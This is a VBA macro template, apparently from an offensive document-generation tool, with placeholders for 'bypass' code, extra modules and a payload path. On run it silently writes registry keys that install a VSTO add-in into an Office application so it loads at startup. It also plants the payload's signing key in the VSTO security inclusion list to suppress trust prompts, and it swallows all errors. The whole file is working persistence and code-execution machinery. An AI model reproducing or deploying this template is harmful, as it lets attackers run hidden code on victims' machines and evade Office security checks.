{{bypassCode}}

{{moduleCode}}

Function RegKeyRead(szRegKey As String) As String
	Dim objWscriptShell As Object
	On Error Resume Next
	Set objWscriptShell = CreateObject("WScript.Shell")
	RegKeyRead = objWscriptShell.RegRead(szRegKey)
	Set objWscriptShell = Nothing
End Function

Function RegKeySave(szRegKey As String, szValue As String, szType As String)
    Dim objWscriptShell As Object
	On Error Resume Next
    Set objWscriptShell = CreateObject("WScript.Shell")
    objWscriptShell.RegWrite szRegKey, szValue, szType
End Function

Function vsto_addin()
    
    Dim VSTODescription As String
    Dim VSTOFriendlyName As String
    Dim VSTOPayloadPath As String
    Dim VSTOAddInName As String
    Dim VSTOOfficeApplication As String
    Dim VSTOCompatableFrameworks As String
    Dim VSTOPreferredClr As String
    Dim VSTOPubKey As String
  
  	On Error Resume Next
	
	{{bypassCalls}}
	
	{{moduleCalls}}
    
    
    VSTOOfficeApplication = "{{OfficeApplication}}"
    VSTOFramework = "{{Framework}}"
    VSTOPreferredClr = "{{PreferredClr}}"
    VSTOCompatableFrameworks = "<compatibleFrameworks xmlns=""urn:schemas-microsoft-com:clickonce.v2"">" & vbCrLf & vbTab & "<framework targetVersion=" & VSTOFramework & " profile=""Full"" supportedRuntime=" & VSTOPreferredClr & "/>" & vbCrLf & vbTab & "</compatibleFrameworks>"
    VSTOOfficeApplication = "{{OfficeApplication}}"
    VSTOGuid = "{{Guid}}"
    VSTOSecurityGuid = "{{SecurityGuid}}"
   
    #If Win64 Then
        VSTOPayloadPath = "{{Path_x64}}"
    #Else
        VSTOPayloadPath = "{{Path_x86}}"
    #End If
    VSTOModulus = "{{Modulus}}"
    VSTOPubKey = "<RSAKeyValue><Modulus>" & VSTOModulus & "</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"

    VSTODescription = "{{Description}}"
    VSTOFriendlyName = "{{FriendlyName}}"
    VSTOAddInName = "{{AddInName}}"
    VSTODescription = "{{Description}}"
    
    ' INSTALL OUTLOOK ADDIN
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VSTOOfficeApplication & "\Addins\" & VSTOAddInName & "\Description", VSTODescription, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VSTOOfficeApplication & "\Addins\" & VSTOAddInName & "\FriendlyName", VSTOFriendlyName, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VSTOOfficeApplication & "\Addins\" & VSTOAddInName & "\Manifest", VSTOPayloadPath, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VSTOOfficeApplication & "\Addins\" & VSTOAddInName & "\Loadbehavior", 3, "REG_DWORD"
    
    ' INSTALL VSTO
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\" & VSTOPayloadPath, "{" & VSTOGuid & "}", "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\addInName", VSTOAddInName, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\officeApplication", VSTOOfficeApplication, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\friendlyName", VSTOFriendlyName, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\description", VSTODescription, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\loadBehavior", "", "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\compatableFrameworks", VSTOCompatableFrameworks, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\SolutionMetadata\{" & VSTOGuid & "}\PreferredClr", VSTOPreferredClr, "REG_SZ"
    
    ' INSTALL VSTO SIGNING KEY
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\Security\Inclusion\" & VSTOSecurityGuid & "\Url", VSTOPayloadPath, "REG_SZ"
    RegKeySave "HKEY_CURRENT_USER\Software\Microsoft\VSTO\Security\Inclusion\" & VSTOSecurityGuid & "\PublicKey", VSTOPubKey, "REG_SZ"

End Function
